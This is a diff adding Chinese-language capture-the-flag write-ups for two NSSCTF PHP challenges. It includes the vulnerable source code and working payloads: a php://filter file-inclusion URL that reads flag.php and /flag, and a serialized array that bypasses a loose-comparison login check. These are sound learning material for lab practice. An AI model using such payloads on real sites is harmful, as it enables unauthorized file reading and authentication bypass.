@@ -214,3 +214,97 @@ http://node4.anna.nssctf.cn:28418/index.php/utils.php/哈哈?show[source=1
 ```
 得到flag
 ![alt text](image-114.png)
+
+## [SWPUCTF 2022 新生赛]ez_ez_php(revenge)
+>url:https://www.nssctf.cn/problem/2821
+```php
+ <?php
+error_reporting(0);
+if (isset($_GET['file'])) {
+    if ( substr($_GET["file"], 0, 3) === "php" ) {
+        echo "Nice!!!";
+        include($_GET["file"]);
+    } 
+
+    else {
+        echo "Hacker!!";
+    }
+}else {
+    highlight_file(__FILE__);
+}
+//flag.php 
+```
+代码的意思是确认file的前三个字符是php，刚好用php伪协议读flag就包含了前三个字符是php的前提条件
+
+构造payload：
+```
+http://node5.anna.nssctf.cn:27422/?file=php://filter/read=convert.base64-encode/resource=flag.php
+```
+![alt text](image-126.png)
+然后解码
+```php
+<?php
+error_reporting(0);
+header("Content-Type:text/html;charset=utf-8");
+
+
+echo   "NSSCTF{flag_is_not_here}" ."<br/>";
+echo "real_flag_is_in_ '/flag' "."<br/>";
+echo "换个思路，试试PHP伪协议呢";
+
+```
+提示了flag在/flag里，修改payload
+```
+http://node5.anna.nssctf.cn:27422/?file=php://filter/read=convert.base64-encode/resource=/flag
+```
+![alt text](image-127.png)
+再解码得到flag
+NSSCTF{8e567b75-c892-40a9-9f28-698640521510}
+
+## [HUBUCTF 2022 新生赛]checkin
+>url:https://www.nssctf.cn/problem/2602
+>知识点：反序列化，弱比较
+
+```php
+<?php
+show_source(__FILE__);
+$username  = "this_is_secret"; 
+$password  = "this_is_not_known_to_you"; 
+include("flag.php");//here I changed those two 
+$info = isset($_GET['info'])? $_GET['info']: "" ;
+$data_unserialize = unserialize($info);
+if ($data_unserialize['username']==$username&&$data_unserialize['password']==$password){
+    echo $flag;
+}else{
+    echo "username or password error!";
+
+}
+
+?>
+```
+这里要满足反序列化的弱比较
+但是注意进行序列化的时候不是用username  = "this_is_secret"和password  = "this_is_not_known_to_you"。因为第五行说了已经修改过内容了，所以如下构造是错的
+```php
+<?php
+$info=array("username"  => "this_is_secret","password " => "this_is_not_known_to_you");
+$info=serialize($info);
+var_dump($info);
+?>
+```
+![alt text](image-128.png)
+在这里正确的方法是
+```php
+<?php
+$info = array(
+	'username'=>true,
+	'password'=>true
+);
+echo  serialize($info);
+
+```
+![alt text](image-129.png)
+所以构造payload:
+```
+http://node5.anna.nssctf.cn:27731/?info=a:2:{s:8:"username";i:0;s:8:"password";i:0;}
+```
+![alt text](image-130.png)
